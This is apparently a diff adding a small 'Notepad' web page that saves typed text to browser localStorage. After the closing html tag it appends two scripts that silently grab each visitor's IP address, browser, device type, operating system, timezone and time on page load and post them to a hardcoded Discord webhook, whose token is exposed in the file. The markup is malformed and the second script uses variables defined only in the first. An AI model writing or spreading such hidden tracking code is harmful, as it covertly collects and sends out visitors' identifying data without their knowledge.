@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>replit</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+
+  <header>
+    Welcome to the Notepad! Type something in and press the button to save it.
+  </header>
+    <script src="script.js"></script>
+  </body>
+
+  </html>
+    <input type="text" id="myTextbox" value="">
+    <button onclick="saveText()">Save</button>
+    <script>
+      function saveText() {
+        localStorage.setItem("textboxValue", document.getElementById("myTextbox").value);
+      }
+      window.onload = function() {
+        document.getElementById("myTextbox").value = localStorage.getItem("textboxValue");
+      }
+    </script>
+
+</html>
+
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ipAddress = data.ip;
+        const userAgent = navigator.userAgent;
+        const deviceType = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : /Macintosh|Windows NT|Linux/i.test(navigator.userAgent) ? 'Computer' : 'Tablet';
+        fetch('https://discord.com/api/webhooks/1246885202450714694/fLpv8oCcsDpnwRFjRY1T6Ts4TEJyOVEfkAprEYl_xSFH-BAXU7-xQQKrRG38z9Uf-nNn', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            content: `IP Address: ${ipAddress} 
+            Browser: ${userAgent}
+            Device: ${deviceType}
+            Time: ${new Date().toLocaleString('en-US', { timeZone: 'America/New_York' })}
+            `
+          })
+        })
+      })
+  </script>
+  <script>
+    // Get the user's timezone
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+    // Get the user's operating system and version
+    const os = navigator.platform;
+    const osVersion = navigator.appVersion;
+
+    // Send the data to Discord
+    fetch('https://discord.com/api/webhooks/1246885202450714694/fLpv8oCcsDpnwRFjRY1T6Ts4TEJyOVEfkAprEYl_xSFH-BAXU7-xQQKrRG38z9Uf-nNn', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        content: `IP Address: ${ipAddress} 
+        Browser: ${userAgent}
+        Device: ${deviceType}
+        Time: ${new Date().toLocaleString('en-US', { timeZone: 'America/New_York' })}
+        Timezone: ${timezone}
+        Operating System: ${os}
+        OS Version: ${osVersion}
+        `
+      })
+    })
+  </script>
